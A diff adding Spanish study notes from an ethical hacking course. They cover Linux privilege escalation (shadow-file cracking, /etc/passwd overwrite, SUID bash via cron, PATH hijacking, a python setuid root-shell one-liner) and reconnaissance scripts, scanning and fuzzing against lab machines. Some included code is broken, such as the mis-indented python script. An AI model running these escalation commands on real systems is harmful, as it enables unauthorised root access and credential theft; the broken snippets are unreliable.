@@ -1,0 +1,421 @@
+comandos:
+xargs -> ejecucion paralela mediante una pipe
+find -> filtraje
+file -> muestra el tipo de archivo
+whoim -> muestra el usuario (root) actual
+grep -> filtraje
+awk `NR===XXX' -> para mostrar una linea en concreto
+head -> muestra las x primeras linea de un archivo
+tail -> muestra las x ultimas lineas de un archivo
+locate -> muestra la dirección absoluta de un archivo
+wc -l -> Muestra el numero de lineas de un output
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Apuntes sobre el curso de introdución al hacking ético de s4vitar. Aclarar que las explotaciones que se muestran, en la gran mayoria, ya no son funcionales de la
+manera que él las explica (ya que són errores de seguridad para ganar acceso a root que ya han sido solucionados, en la versión actual de linux).
+Por lo tanto, estos metodos se deben de tomar como simple práctica y conocimiento básico.
+
+EXLOTACIÓN Y ABUSO DE LOS PRIVILEGIOS:
+-find \-perm -4000 (2>/dev/null) -> Para buscar quien tiene privilegios SUID (los directorios a los que no pueda acceder se redirijen hacia /dev/null).
+-cat /etc/shadow | grep "ENCRYPT_METHOD" -> Para mostrar el metodo de encritado de las passwords de los usuarios -> Con una wordlist como rockyou.
+-cat /etc/shadow | grep raul > hash -> Cojes la contraseña encriptada del usuario raul.
+-john --wordlist=rockyou.txt hash -> Para romper la contraseña hash podemos utilizar john con el wordlist rockyou.
+-find \-writable (2>/dev/null) | grep "etc" -> Filtramos por los archivos que se puedan escribir como "otros" y ademas ponemos un filtro para el directorio /etc
+que es critica.
+Si podemos escribir en /etc/passwd y cambiamos la X (contraseña hasheada) y ponemos nostros un hash que hemos creado con anterioridad con openssl pssword 
+(tiene que ser del tipo DES(Unix) se puede comprobar con hash-identifier o hashid), después cuando hagamos sudo su y nos pida la contraseña de root podremos
+ganar acceso poniendo poniendo la contraseña sin hashear que hemos sustituido en /etc/passwd. (NO COMPROVADO)
+
+DETECCIÓN DE TAREAS CRON A TRAVES DE UN SCRIPT EN BASH
+-ps -eo command -> lista los comandos que se estan ejecutando en tiempo real -> con esto creamos un script para que nos muestre por pantalla los comandos que se van 
+ejecutando en cada momento (diff entre los viejos y los nuevos), y aplicamos un filtro para ver solo lo que nos interesa (en este caso las tareas cron que se estan
+ejecutando). Seguidamente miraremos si algunas de estas tareas es writable por otros, y si lo es, modificaremos el archivo para que ejecute:
+-chmod 4755 /bin/bash -> de esta manera cuando el sistema ejecute el archivo cron dará privilegios SUID a la bash, de forma que "otros" podran ganar acceso a la shell
+con el comando:
+-bash -p -> donde -p es una flag de seguridad necesaria para hacer uso de los privilegios SUID. (NO FUNCIONAL)
+
+EXLOTACIÓN DE UN PATH HIJACKING FRENTE A UN BINARIO SUID
+Primeramente, programaremos un pequeño programa en c que lo unico que hace es ejecutar un par de llamadas a sistema. En c como medida de segurida nos obliga a
+declarar setuid(0) para que lo podamos ejecutar con los privilegios SUID cuando usamos un usuario no propietario (otros).
+-echo $PATH -> Nos mostrara las diferentes rutas por la que busca los comandos que ejecutamos. Por eso cuando hacemos la llamada a sistema whoami nos devuelve
+lo mismo que si lo hacemos por la ruta aboluta /usr/bin/whoami. Por tanto, que pasará si creamos un archivo llamado whoami en una ruta más prioritaria que
+/usr/bin? Al no ejecutarlo con la ruta absoluta el sistema encontraría antes el whoami que hemos creado.
+-export PATH=.:$PATH -> Este comando se utiliza para modificar la prioridad de las rutas, en este caso se esta poniendo la ruta actual como la más prioritaria
+(.) aunque podemos poner cualquier ruta. Estos cambios son temporales por cada sesión.
+-strings backup (binario) -> Con strings se nos permite mostrar las cadenas de caracteres de un binario para de esta forma poder averiguar que comandos se estan 
+ejecutando y si se esta haciendo desde una ruta absoluta o no.
+Esto mismo se puede utilizar para lanzar una shell como root. Ya que el ejecutable del programa c tiene privilegios SUID, modificaremos $PATH para que la ruta más 
+prioritaria sea /tmp donde tendremos un script que lanza una shell (bash -p). Por lo tanto, cuando se ejecute el programa en c y se haga la llamada a sistema ps 
+utilizando la ruta relativa realmente se estará ejecutando nuestro script de la shell y ganaremos acceso a root. (NO FUNCIONAL)
+
+EXPLOTACIÓN Y ABUSO DE LAS CAPABILITIES EN LINUX
+Hay veces que es un tanto desafiante convertirse en root y no merece la pena. Existe otra alternativa, lo que se conoce como persistencias. Otra cosa que podriamos
+hacer para pasar más desapercibidos es mediante la explotación y el abuso de las capabilities.
+-getcap -r / 2>/dev/null -> Para mostrar las capabilities que hayan definidas a nivel de sistema en la raiz de forma recursiva, 2>/dev/null lo utilizamos para un
+mejor filtraje al eliminar el stderr (ya que habrá rutas a las que no tenga acceso al no ser root).
+-setcap cap_setuid+ep /usr/bin/python3.8 -> Le asignamos a python3.8 la capability del setuid+ep (utilizada más adelante para poder poner el setuid(0)).
+-setcap -r cap_setuid+ep /usr/bin/python3.8 -> Con -r le quitamos la capability
+-python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")' -> -c quiere decir desde una consola interactiva en un 'one liner', se importa la libreria os y
+atraves de un atributo de os que es setuid(0) le indiacamos que queremos operar con el id=0 (root) y seguidamente, atraves de otro atributo de os, indicamos que 
+queremos hacer una llamada al sistema y abrir una bash.
+Hay muchos tipos de capabilities que nos permiten explotar diferentes servicios para ganar acceso a root. En iternet se pueden buscar. Ej GTFOBins. (NO FUNCIONAL)
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+PENTESTING: 5 fases -> Reconocimiento inicial | Busqueda de versiones y exploits | Explotación | Obtención de resultados | Documento ejecutivo y técnico (Auditorias)
+
+FASE DE RECONOCIMIENTO INICIAL - ENUMERACIÓN DE PUERTOS CON NMAP
+-ping -c 1 10.0.2.2 -> Envia una trama ICMP a la dirección IP que pongamos (el gateway del router en mi caso). Podemos observar que si el TTL esta cerca de 64, estamos
+ante una maquina linux y, por otro lado, si esta cerca de 128 nos estará responiendo una maquina windows.
+-nmap 10.0.2.2 -p- --open -T5 -v -n -oG allPorts -> La herramienta nmap nos permite escanear los puertos de una máquina objetivo. Con el argumento '-p-' le marcamos
+que queremos escanear los 65535 puertos. El argumento --open lo utilizamos para que nos indique solamente los puertos abiertos. -T sirve para marcar el grado de 
+agresividad (cuanto más alto más agresivo y rapido hará el escaneo). Ponemos -v para el verbose y conforme vaya encontrando puertos nos los vaya mostrando sin esperar
+a la finalización del escaneo completo. El -n para marcar que no queremos hacer resolución DNS ya que es muy costosa en tiempo. Y por último, lo exportamos en formato 
+grepable a un fichero llamado allPorts. 
+
+CREANDO UNA PEQUEÑA UTILIDAD EN BASH PARA EL FILTRADO DE PUERTOS
+La utilidad tendrá la función de mostrar la informació más relevante del fichero allPorts (fichero que contiene los puertos abiertos de una cierta dirección IP). Lo 
+haremos filtrando por expresiones regulares:
+-cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS= "/" | xargs | tr ' ' ',' -> Para filtrar el output del fichero allPorts. Primeramente, hacemos un primer
+filtrage con grep de forma que solo imprima por pantalla los numeros de 1 a 5 digitos que vayan acompañados de un /open. Con este output hacemos un segundo filtraje
+con awk para que muestre el primer argumento, teniendo como delimitador "/" (otra opción seria cut -d '/' -f 1). De esta forma solamente nos mostrará el numero del
+puerto abierto. Utilizaremos xargs para compartarlo todo en una misma linea y tr para efectuar la sustitución de los espacios por comas. Resultado: 22,80,443,445
+-cat allPorts | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u -> Mediante este filtraje con expresiones regulares se nos estarian listando las direcciones
+IP del fichero allPorts (dirección IP víctima). Para que no muestre la dirección IP repetidas veces utilizamos el comando sort -u.
+Para utilizar la utilidad modificaremos el archivo .zshrc en caso de tener una shell zsh (si trabajaramos en bash modificariamos .bashrc), creando una función que
+aplique los filtrajes mencionados al archivo allPorts:
+	
+	function extractPorts(){
+    	echo -e "\n${purpleColour}[*] Extracting information...${endColour}\n"
+    	ip_address=$(cat allPorts | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)
+    	open_ports=$(cat allPorts | grep -oP '\d{1,5}/open' | awk '{print $1}' FS="/" | xargs | tr ' ' ',')
+
+   	echo -e "${redColour}[*] IP Address: ${endColour}${grayColour}$ip_address${endColour}"
+    	echo -e "${redColour}[*] Open Ports: ${endColour}${grayColour}$open_ports${endColour}\n"
+
+    	echo $open_ports | tr -d '\n' | xclip -sel clip
+    	echo -e "${purpleColour}[*] Ports copied to clipboard!${endColour}\n"
+	
+Para el correcto funcionamiento de los colores será necesario añadir al archivo las siguientes lineas:
+
+	greenColour="\e[0;32m\033[1m"
+	endColour="\033[0m\e[0m"
+	redColour="\e[0;31m\033[1m"
+	blueColour="\e[0;34m\033[1m"
+	yellowColour="\e[0;33m\033[1m"
+	purpleColour="\e[0;35m\033[1m"
+	turquoiseColour="\e[0;36m\033[1m"
+	grayColour="\e[0;37m\033[1m"
+
+De esta forma, utilizando el comando extractPorts allPorts se nos mostrará tanto la IP víctima como los puertos abiertos. Además, se nos habrá copiado los puertos
+abiertos en la clipboard (portapapales).
+
+
+
+DETECCIÓN DE VERSIÓN Y SERVICIOS CON NMAP
+Vamos a lanzar una serie de scrips basicos de enumeración con nmap, para tratar de descubrir la versión y el servició que corren los puertos abiertos.
+-nmap -sC -sV -p22,80 10.0.2.2 -oN targeted -> -sC para detectar el servicio (script) que esta corriendo y -sV para la versión. Indicamos para que puertos queremos la
+información de cierta dirección IP y lo exportamos en formato nmap (fichero .txt) a un fichero llamado targeted.
+Si encontramos el puerto 80 abierto (utilizado para las páginas web) podemos utilizar whatweb para ver la información más relevante.
+-whatweb http://10.10.10.188 2>/dev/null -> utilizamos el stderr (2>/dev/null) para la gestión de errores. 
+
+
+TÉCNICAS PARA AGILIZAR NUESTROS ESCANEOS CON NMAP
+En algunas ocasiones con la anterior configuración el escaneo de nmap puede llevar bastante tiempo en completarse. Vamos a proponer otra configuración para tratar de
+solventar este problema. Una posible solución sería:
+-nmap --top-ports 5000 --open -T5 -v -n 10.10.10.11 -> Lo que hacemos aqui es escanear solamente los 5000 puertos más relevantes, por lo tanto, puede ser una buena
+solución pero es posible que nos estemos dejando algun puerto abierto por escanear. Otra solución sería (TCP-SYN scan):
+-nmap -sS --min-rate 5000 --open -vvv -n -Pn -p- 10.10.10.11 -> -sS para marcar el tipo de scaneo TCP-SYN, con --min-rate 5000 marcamos que queremos emitir paquetes no
+más lentos que 5000 paquetes/s. En este caso también utilizamos -Pn para marcar que no queremos que aplique host discovery (a través del prtocolo de resolución de
+direcciones -> ARP).
+
+
+CREACIÓN DE HERRAMIENTA EN BASH PARA LA DETECCIÓN DE PUERTOS TCP ABIERTOS
+Para detectar puertos abiertos, de una forma más discreta que con nmap, podríamos crear un script en bash llamado portScan que sea capaz de detectar los puertos
+abiertos mediante el protocolo TCP de forma manual.
+Para ello nos tenemos que aprovechar de un concepto que nos permitirá saber si un puerto de una cierto dirección IP está abierto o no.
+-bash -c "echo ' ' > /dev/tcp/10.0.2.2/port" -> lo que estamos haciendo es mandar un espacio vacio mediante TCP a la IP y puerto indicado. Si lo enviamos a un puerto
+que esta abierto veremos que no hace nada, en cambio cuando lo enviamos a un puerto cerrado nos aparece un mensaje de error. Para comprobarlo:
+-echo $? -> Si nos muestra un 0 quiere decir que el comando anterior ha tenido exito (el puerto está abierto) y si nos muestra un 1 quiere decir que no lo ha tenido
+(el puerto está cerrado).
+Aprovechando esto podemos crear el siguiente scrip en bash para detectar puertos abiertos mediante TCP:
+
+	#!/bin/bash
+
+	# ./portScan.sh <ip-address>
+
+	#Colours
+	greenColour="\e[0;32m\033[1m"
+	endColour="\033[0m\e[0m"
+	redColour="\e[0;31m\033[1m"
+
+	if [ $1 ]; then
+    	    ip_address=$1
+    	    for port in $(seq 1 65535); do
+                timeout 1 bash -c "echo ' ' > /dev/tcp/$ip_address/$port" && echo -e "[*] Port ${redColour}$port${endColour} - ${greenColour}OPEN${endColour}" &
+    	    done; wait
+	else
+    	    echo -e "\n[*] Use: .portScan.sh <ip_address>\n"
+            exit 1
+	fi
+
+Combinamos el comando visto anteriormente con un && para que nos printe el puerto abierto. El & final marca que uilice varios hilos de forma que todas las peticiones
+salgan a la vez y no se tengan que esperar entre ellas.
+
+CREACIÓN DE HERRAMIENTA EN BASH PARA EL DESCUBRIMIENTO DE EQUIPOS EN LA RED
+Como en el ejemplo anterior, podemos utilizar nmap para el reconocimiento de maquinas en un segmento de red, pero és muy ruidoso. Por lo tanto, merece la pena que
+tengamos nuestro propio script. De forma similar al ejemplo anterior, nos aprovecharemos de un concepto en concreto. En este caso es que si enviamos un ping a una
+dirección IP, este nos contesta y el comando echo $? nos mostrará un 0. De forma contraria, si no nos contesta nos devolverá un 1. Podemos crear el siguiente script:
+
+	#!/bin/bash
+
+	#Colours
+	greenColour="\e[0;32m\033[1m"
+	endColour="\033[0m\e[0m"
+	purpleColour="\e[0;35m\033[1m"
+	redColour="\e[0;31m\033[1m"
+
+	for i in $(seq 2 254); do
+    	    timeout 1 bash -c "ping -c 1 10.0.2.$i > /dev/null 2>&1" && echo -e "${redColour}[*]${endColour} ${purpleColour}Host 10.0.2.$i${endColour} - ${greenColour}ACTIVE${endColour}" &
+	done; wait
+
+- > /dev/null 2>&1 -> Lo utilizamos para que no nos muestre el output del comando, de forma que solo veamos el mensaje. El ejemplo esta hecho con la dirección
+10.0.2/24 pero, obviamente podemos modificarla segun necesitemos e incluso poner un doble bucle para buscar en una red /16, por ejemplo.
+
+RECONOCIMIENTO A TRAVES DE LOS SCRIPTS QUE INCORPORA NMAP POR CATEGORIA
+Anteriormente hemos hablado de utilizar scripts básicos de enumeración con el parametro -sC, pero ¿dónde se encuentran esos scripts y que categoria tienen?
+Lo podemos hacer con los siguientes comandos:
+-updatedb -> Para sincronizar todos los archivos existentes a nivel de sistema en una base de datos.
+-locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u -> Una vez actualizado, con locate me va a mostrar la ruta absoluta de un archivo. En este caso, nos intersa los archivos con extension .nse que son los
+scripts de nmap. Paralelamente, con xargs quiero que para cada script me haga un grep de su categoria. Después, si lo que queremos es que nos muestre todas las
+categorias existentes podemos utilizar un grep que nos filtre por expresiones regulares (le decimos que muestre toda la información que haya entre comillas, que es el
+nombre de la categoria). Por último, sort -u para ordenar de forma unica.
+Hay un total de 14 categorias y sabiendo sus nombres podemos utilizarlos para lanzar una serie de scripts de una categoria en concreto. Por ejemplo:
+-nmap -p445 10.10.10.40 --script "vuln and safe" -oN smbScan -> Para el puerto 445 (samba) estamos lanzando una serie de scripts de la categoria vuln y safe y
+exportando a un archivo llamado smbScan en formato nmap. Como vemos, las categorias se pueden fusionar con un and o un or.
+
+USO DE SCRIPTS ESPECIFICOS DE NMAP Y USO DE ANALIZADORES DE TRAFICO
+Nmap a parte de la enumeración de servicios también te permite, entre otras cosas, listar directorios que puedan exister en el servidor web (incluido archivos).
+¿Cómo hacemos esto? Mediante scripts:
+-nmap -p80 10.10.10.188 --script http-enum -oN webScan -> Utilizamos el script http-enum (fuzzing). Básicamente lo que trata de hacer este script es, mediante un
+diccionario interno que tiene nmap, mandar peticiones al servidor web de directorios o archivos que puedan existir (método GET). Gracias al codigo que nos retorne el
+servidor a esta petición (403 ERROR o 200 OK) sabremos si el directorio o archivo, en la mayoria de casos, existe en el servidor web.
+Una forma de poder saber que esta pasando por detrás cuando ejecutamos este script es utilizando tcpdump:
+-tcpdump -i tun0 -w Captura.cap -v  -> Escucha el trafico que pasa por la interfaz indicada y exporta el output en el fichero Captura.cap
+Para interpretar esta captura podemos utilizar tshark (wireshark pero sin interficie grafica) y aplicando filtros podemos averiguar que diccionario interno esta 
+utilizando nmap:
+-tshark -r Captura.cap -Y "http" -Tfields -e tcp.payload 2>/dev/null | xxd -ps -r | grep "GET" | awk '{print $2}' | sort -u -> Se estan aplicando varios filtros,
+primeramente, estamos filtrando por peticiones web http. Con el parametro -Tfields -e aplicamos otro filtro del campo que nos interese (los diferentes campos los 
+podemos saber haciendo una pequeña busqueda antes con el parametro -Tjson). Como este campo esta codificado en hexadecimal utilizamos xxd con los parametros -ps -r
+para hacer el 'reverse' de la codificación y que de esta forma sea legible. Una vez decodificado aplicamos otro filtro, ya que solo nos intersa las peticiones GET y 
+utilizamos awk para que nos muestre solamente el segundo parametro, sort -u para ordenar de forma unica. 
+
+USO DE WIRESHARK PARA EL ANALISIS DE TRÁFICO EN LA RED
+Básicamente, wireshark es como tshark pero con interfaz gráfica, lo que lo hace un poco más fácil de manejar a pesar de sus limitaciones. Para poder abrir wireshark
+desde terminal como un programa totalmente a parte tenemos que ejecutar lo siguientes comandos:
+-wireshark Captura.cap > /dev/null 2>&1 & 
+-disown
+De esta forma lo que hacemos es redirigir el stderr output al dev/null y con & lo hacemos un proceso aislado a la terminal. Finalmente, para que el proceso no muera
+al cerrar la terminal (ya que wireshark es el proceso hijo) ejecutamos disown.
+
+
+CREACIÓN DE SCRIPT EN PYTHON3 PARA IDENTIFICAR EL SISTEMA OPERATIVO
+Crearemos una utilidad en python3 que, donde dando la dirección IP como parámetro, nos muestre el sistema operativo de la víctima. Esto se puede hacer mediante el
+campo TTL (64 en Linux y 128 en Windows) en el momento que lanzamos un ping. Hay que tener conocimientos básicos de python para realizar este tipo de scripts, por lo
+que es recomendable aprender los conceptos básicos del lenguaje.
+
+	#!/usr/bin/python3
+	import re, sys, subprocess
+
+	# usage: $ python3 whichSystem.py <ip>
+
+	if len(sys.argv) != 2:
+    	   print("\n[!] Usage: python3 " + sys.argv[0] + " <direccion-ip>\n")
+    	   sys.exit(1)
+
+	def is_valid_ip(ip_address):
+            # Utilizamos una expresión regular para verificar el formato de la dirección IP
+            ip_pattern = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
+    	    return re.match(ip_pattern, ip_address) is not None
+
+
+	def get_ttl(ip_address):
+    	    if not is_valid_ip(ip_address):
+            print("\n[!] Dirección IP no válida. Por favor, introduzca una dirección IP válida.\n")
+            sys.exit(1)
+
+    	    proc = subprocess.Popen(["/usr/bin/ping -c 1 %s" % ip_address, ""], stdout=subprocess.PIPE, shell=True)
+            (out, err) = proc.communicate()
+    	    out = out.split()
+    	    out = out[12].decode('utf-8')
+    	    ttl_value = re.findall(r"\d{1,3}", out)[0]
+
+	    return ttl_value
+
+
+	    def get_os(ttl):
+       	    ttl = int(ttl)
+            if ttl >= 0 and ttl <= 64:
+                return "Linux"
+    	    elif ttl >= 65 and ttl <= 128:
+                return "Windows"
+    	    elif ttl >= 129 and ttl <=254:
+        	return "Solaris/AIX"
+    	    else:
+        	return "Not Found"
+
+	if _name_ == '__main__':
+            ip_address = sys.argv[1]
+            ttl = get_ttl(ip_address)
+    	    os_name = get_os(ttl)
+    	    print("\n[*] %s (ttl -> %s): %s\n" % (ip_address, ttl, os_name))
+
+A rasgos generales, vemos como lanzamos un ping a la dirección IP pasada por parámetro y después aplicamos una serie de filtros para quedarlos solamente con el valor
+del TTL. Con este valor podemos determinar que SO tiene la máquina víctima.
+Una vez que tenemos nuestro script, le damos permisos de ejecución y lo podemos poner en alguna ruta del PATH para poderlo mencionar desde una ruta relativa. Por
+ejemplo lo podemos mover a /usr/bin.
+
+
+USO DE WFUZZ PARA HACER FUZZING
+Fuzzing -> Encontrar rutas dentro de un servidor web. Anteriormente, ya hemos utilizado un script de nmap para hacer fuzzing (http-enum), pero no es una herramienta 
+especialidada en el fuzzing. Si queremos profundizar un poco más tendremos que utilizar otras herramientas, como Wfuzz.
+-wfuzz -c -L -t 400 --hc=404 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt https://@IP/FUZZ -> Parametros: -c lo ponemos para que nos muestre el
+output en formato colorizado, -L para que haga un follow-redirect, de esta forma nos ahorramos los codigos 301 y nos muestra el estado final de la petición
+(código 200), con -t especificamos los threads (cuantas peticiones se hacem simultaniamente), --hc=404 para que en el output no nos muestre las peticiones que vayan
+con el codigo de error 404 (hc = hide code), -w para especificar el diccionario que vamos a utilizar, el cual contiene muchhisimos nombres de directorios que se van a
+probar por fuerza bruta.
+El fuzzig se hace contra la dirección IP indicada y con /FUZZ indicamos donde queremos que se sustituyan las palabras del diccionario. Podemos jugar con varios filtros
+al mismo tiempo. Ej. --sc=200 --hl=170 (sc = show code). Hay muchos más filtros (por lineas, palabras, carácteres...) que se pueden consultar con el manual.
+
+
+FUZZING DE EXTENSIONES DE ARCHIVO CON WFUZZ (USO DE MULTIPLES PAYLOADS)
+Hasta el momento, cuando hacemos fuzzing contra una página web probamos con un montón de nombres de directorios y archivos pero no sabemos que extensión tiene, por lo
+que tampoco sabemos con que estamos tratando. Para hacer una comprobación de que tipo de archivos tiene la víctima hacemos uso de otro diccionario:
+-wfuzz -c -L -t 400 --hc=404 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt -w extensiones.txt https://@IP/FUZZ.FU2ZZ -> Donde el extensiones.txt es
+un archivo creado por nosotros que contiene las extensiones que queremos combrobar.
+Por lo tanto, con el /FUZZ.FU2ZZ lo que hacemos es que para cada palabra del primer diccionario buscamos si tiene algunas de las extensiones del segundo diccionario.
+Wfuzz cuenta con su propio User-Agent, esto es una cabecera retocable con el parámetro -H "User-Agent: Google Chrome", y de esta forma ya estaría trabajando bajo ese
+User-Agent (incluso se pueden utilizar cookies de sesión para aplicar fuzzing a recursos internos de un panel, ya estando autenticados).
+
+
+USO DE DIRBUSTER PARA HACER FUZZING
+Dirbuster tiene el mismo prósito que Wfuzz pero, igual que pasaba con Wireshark, esta tiene interficie gráfica. Para abrir Dirbuster lo haremos del mismo modo que
+haciamos con Wireshark:
+-dirbuster > /dev/null 2>&1 & 
+-disown
+A modo de recordatorio, lo que hacemos es redirigir el stderr output al dev/null y con & lo hacemos un proceso aislado a la terminal. Finalmente, para que el proceso
+no muera al cerrar la terminal (ya que dirbuster es el proceso hijo) ejecutamos disown.
+Si haciendo fuzzing encontramos, por ejemplo, un directorio con varios archivos lo que podemos hacer es:
+-wget -r http://IP/<nombre-directorio> -> Para descargar todo los archivos que haya en el directorio de forma recursiva. Una vez descargado todos los archivos
+podriamos hacer busquedas recursivas por palabras clave para encontrar información relevante. Ej:
+-grep -r -E -i "pass|user|key|database" | less -S -> Parametros: -r de forma recursiva, -E para diversos campos, -i sin atender a mayusculas o minusculas, less -S para
+que no haya saltos de linea y de esta forma sea mas legible el output.
+
+
+USO DE DIRB PARA HACER FUZZING
+Dirb es una herramienta para hacer fuzzing un poco más sencilla que las que ya hemos visto. No tiene hilos de ejecución, por lo que puede ir un poco lenta. Si no
+especificamos un diccionario utilizará uno interno (el qual se muestra cuando se ejecuta la herramienta), pero este és muy pequeño por lo que se recomienda utilidar
+el de dirbuster, por ejemplo:
+-dirb https://IP -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt
+
+
+USO DE GOBUSTER PARA HACER FUZZING
+Gobuster es una herramienta hecha en el lenguaje de programación 'Go' y esta trabaja muy bien con sockets y conexiones, por lo que es una herramienta bastante potente.
+Con el comando gobuster se puede ver un poco de información de los parametros que admite la herramienta, ya que en este caso no tenemos manual.
+-gobuster dir -t 100 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt --url https://IP -> Parametros: tenemos que poner 'dir' para entrar en un modo de
+furza bruta por directorio o archivo, -t para indicar los hilos de ejecución, -w para indicar el diccionario y --url para indicarle la dirección IP.
+Un punto positivo de esta herramienta es que nos muestra la barra de progreso, lo que nos da un tiempo estimado de ejecución.
+
+
+USO DE DIRSEARCH PARA HACER FUZZING
+Dirsearch no es una herramienta predeterminada, por lo que hay que descargarla desde github. Esta herramienta nos permite jugar con muchos parametros, lo que la hace
+muy útil y cómoda.
+-./dirsearch.py -u https://IP -E -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt -> Parámetros: -u para indicar la url, -w para indicar el diccionario, 
+con -E hacemos que utilice un diccionario de extensiones por defecto.
+Como vimos en Wfuzz, esta también nos permite jugar con las cookies para aplicar fuzzing a recursos internos estando ya autenticados, cambiar los headers o aplicar
+filtros. Es una herramienta que nos da mucha versatilidad.
+Wfuzz y dirsearch son las herramientas más completas para hacer fuzzing.
+
+
+TÉCNICAS DE ENUMERACIÓN BAJO UN SERVIDOR WEB
+Segunel gestor de contenido (Wordpress, drupal...) lo más probable es que tengamos que utilizar herramientas específicas que te escanean este gestor de contenido en 
+concreto.
+Un ejemplo, en una página web con un gestor de contenido Wordpress, hacemos Ctrl+u para ver el código fuente. Si vemos que las imagenes hacen elusion a una misma
+dirección que es la que tiene el contenido. En estos casos podemos pensar en un concepto llamado Virtual Host Routing, que te permite contar con multiples servidores
+virtuales web (en este caso) desde una misma máquina, es la capacidad en base al DNS de alojar multiples servidores web. En función del dominio que especifiquemos nos
+carga una web distinta.
+Ante esta situación lo que podemos hacer es modificar el archivo /etc/hosts:
+
+	127.0.0.1   localhost
+	127.0.1.1   parrot
+
+	IP   	   <dominio>
+
+De esta forma, cualquier consulta que se realice al domio indicado se resuelva a la IP indicada. Si podemos acceder a la dirección que tiene el contenido de las
+imagenes es que se estaba haciendo uso del Virtual Host Ruting y lo hemos explotado.
+Ahora nos gustaría saber si el servidor web contiene un WAF (Web Application Firewall). Este es un tipo de firewall que filtra o bloquea el tráfico HTTP hacia y desde
+la aplicación web. Podemos utilizar herramientas como Wafw00f <ip> para saber si la web tiene un WAF.
+Algo que tenemos que tener claro es que para cada gestor de contenido existen diferentes herramientas para efectuar un reconocimento. Es nuestro trabajo buscar esas
+herramientas y documentarnos para aprender a utlizarlas. En este caso, estamos frente a un Wordpress, por lo que podriamos utilizar Wpscan:
+-wpscan --url "http://IP" -e vp,u -> Parámetros: --url para indicar el dominio de la página, ya sea mediante la IP o el nombre, -e vp,u para enumerar plugins vulnerables
+(vulnerable plugins) y usuarios existentes en el gestor de contenido.
+La herramienta te efectua un reconocimento sobre el gestor de contenido y trata de dictarte por consola si hay vulnerabiliades potenciales. Aunque el gestor de
+contenido este actualizado a su última versión, si utiliza un plugin desactualizado puede ser vulnerable. Hay muchas herramientas de reconocimiento que podemos
+econtrar via internet que también hacen muy buen trabajo, algunas són más generales, como nikto, openVAS o nessus, o más epecializadas en un gestor de contenido, como
+ya hemos visto. Así que hay que tenerlas en cuenta para según que situaciones. Por ejemplo, WPSeku es otra herramienta de scaneo para wordpress, disponible vía github
+y su funcionamiento sería el siguiente:
+-python3 wpseku.py -u http://<dominio> -> Escaneo básico, solamente especificamos la url.
+
+
+HACKEANDO NUESTRA PRIMERA MAQUINA
+Hasta este punto ya hemos visto la metodologia para enumerar puertos, servicios que corren bajo estos puertos, versiones... Con esto, vamos a ver como un atacante es
+capaz de hackearla y ganar acceso al sistema. En este caso, nos vamos a enfrentar a una máquina linux con un servidor web donde tiene multiples rutas, con distintos
+gestores de contenido, entre ellos Wordpress que hemos visto anteriormente. Vamos a suponer que la IP víctima es la 10.10.10.88, con la que trabajaremos.
+Vamos a ver paso a paso lo que tendríamos que hacer. Antes de la fase de reconocimiento hacemos unos preparativos:
+-ping -c 1 10.10.10.88 -> Para ver si la máquina esta activa y nos responde. Cabe la posibilidad que tenga desactivado el ping pero si este activa, en este caso
+tendríamos que utilizar otra trama que no sea un ICMP, por ejemplo TCP o UDP.
+-whichSystem 10.10.10.88 -> Ejecutamos script (hecho anteriormente) que nos indica el sistema operativo de la víctima. En este caso es un Linux.
+-mkdir TartaSauce -> Creamos directorio con el nombre de la máquina víctima. En este caso, TartaSauce.
+-mkt -> Función, hecha por nostros (modificando el zshrc), que nos crea los directorios de trabajo. Content, exploits, nmap, scripts y tmp.
+Ahora si a partir de aqui empezamos la FASE DE RECONOCIMIENTO:
+-nmap -p- --open - T5 -v -n 10.10.10.88 -oG allPorts -> Hacemos un reconocimiento de todos los puertos con nmap y lo exportamos en formato grepable al fichero allPorts.
+-extratPorts allPorts -> Función, hecha por nostros (modificando el zshrc), que nos extrae los puertos abiertos que nos indica el fichero allPorts y nos los copia en 
+la clipboard. En este caso, unicamente el puerto 80 esta abierto.
+-whatweb https://10.10.10.88 2>/dev/null -> Como el perto 80 esta abierto, miramos la información más relevante del servidor web.
+-nmap -sC -sV -p80 10.10.10.88 -oN targeted -> Para el puerto 80, lanzamos unos scripts básicos de enumeración y tratamos de averiguar la versión del servidor web. Lo 
+exportamos en formato nmap al fichero targeted. En este caso, uno de los scripts que nos esta lanzando es el http-robots que nos reporta que hay ciertas rutas dentro 
+del robot que son visibles. Por tanto, si buscamos 10.10.10.88/robots.txt se nos van a listar una serie de directorios.
+-nmap --script https-enum -p80 10.10.10.88 -oN webScan -> Antes de aplicar fuzzing con herramientas especializadas, lanzamos el script http-enum y lo exportamos, en 
+formato nmap, al fichero webScan.
+-wfuzz -c -L -t 400 --hc=404 -w /usr/share/worldlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.88/webservices/FUZZ -> Utilizamos Wfuzz para hacer un
+ataque por fuerza bruta haciendo uso de diccionarios pero, no en la dirección IP sino en el directorio webservices que hemos encontrado anteriormente en el robots.txt.
+Vemos que nos encuentra el directorio wp, que no estaba en robots.txt. Cuando accedemos https://10.10.10.88/webservices/wc veremos una pagina relacionada con wordpress,
+por lo que intentamos entrar en el login default (https://10.10.10.88/webservices/wp/wp-login.php) y vemos que nos deja. En este punto debemos pensar directamente en
+una herramienta de escaneo del gestor de contenido, en este caso Wpscan.
+-wpscan --url "https://10.10.10.88/webservices/wp/" -e vp,u -> Hacemos un escaneo general del gestor de contenido para ennumerar plugins vulnerables y usuarios.
+En este caso, no nos muestra nada relevante haciendolo de esta forma. Vamos a intentar hacerlo de forma manual.
+Sabemos que los plugins de wordpress se suelen almacenar en una ruta llamada wp-content/, por lo que si nos vamos a https://10.10.10.88/webservices/wp/wp-content
